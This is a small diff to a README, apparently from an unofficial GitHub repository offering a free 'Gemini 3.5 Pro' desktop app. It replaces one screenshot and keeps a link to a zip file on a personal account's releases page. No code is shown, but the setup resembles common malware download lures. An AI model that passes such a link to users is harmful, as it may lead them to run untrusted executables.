@@ -8,7 +8,7 @@
 [Download `Gemini3.5Pro-desktop.zip`](https://github.com/minamakin-B/Gemini-3.5-Pro-Free/releases/download/v3.5/Gemini3.5Pro-desktop.zip)
 ---
 
-<img width="1784" height="882" alt="ChatGPT Image 12 июл  2026 г , 20_48_25(1)" src="https://github.com/user-attachments/assets/8967edf5-9b78-4fbd-a4bf-74c2ff5dc3de" />
+<img width="1780" height="884" alt="ChatGPT Image 12 июл  2026 г , 21_01_50(1)" src="https://github.com/user-attachments/assets/efa1e6ea-965c-4178-8a10-94a6bdb26a5f" />
 
 
 ## Key Features
